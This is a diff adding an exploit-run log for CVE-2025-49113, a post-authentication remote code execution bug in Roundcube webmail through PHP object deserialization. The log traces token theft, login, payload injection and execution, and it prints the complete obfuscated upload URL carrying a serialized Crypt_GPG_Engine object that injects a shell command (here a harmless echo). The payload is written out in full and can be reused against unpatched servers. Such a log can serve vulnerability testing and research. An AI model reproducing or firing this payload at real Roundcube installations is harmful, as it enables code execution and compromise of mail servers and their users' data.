@@ -1,0 +1,25 @@
+﻿### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
+
+### Retrieving CSRF token and session cookie...
+
+### Authenticating user: testuser
+
+### Authentication successful
+
+### Command to be executed: 
+echo ===
+
+### Injecting payload...
+
+### End payload: http://13.125.104.131:30083/?_from=edit-%21%C9%22%C9%3B%C9i%C9%3A%C90%C9%3B%C9O%C9%3A%C91%C96%C9%3A%C9%22%C9C%C9r%C9y%C9p%C9t%C9_%C9G%C9P%C9G%C9_%C9E%C9n%C9g%C9i%C9n%C9e%C9%22%C9%3A%C91%C9%3A%C9%7B%C9S%C9%3A%C92%C96%C9%3A%C9%22%C9%5C%C90%C90%C9C%C9r%C9y%C9p%C9t%C9_%C9G%C9P%C9G%C9_%C9E%C9n%C9g%C9i%C9n%C9e%C9%5C%C90%C90%C9_%C9g%C9p%C9g%C9c%C9o%C9n%C9f%C9%22%C9%3B%C9S%C9%3A%C91%C90%C9%3A%C9%22%C9e%C9c%C9h%C9o%C9+%C9%3D%C9%3D%C9%3D%C9%3B%C9%23%C9%22%C9%3B%C9%7D%C9i%C9%3A%C90%C9%3B%C9b%C9%3A%C90%C9%3B%C9%7D%C9%22%C9%3B%C9%7D%C9%7D%C9&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload
+
+### Payload injected successfully
+
+### Executing payload...
+
+### TIMING: pre-logout GET / took 0.577s
+
+### TIMING: logout GET took 0.061s
+
+### Exploit executed successfully
+
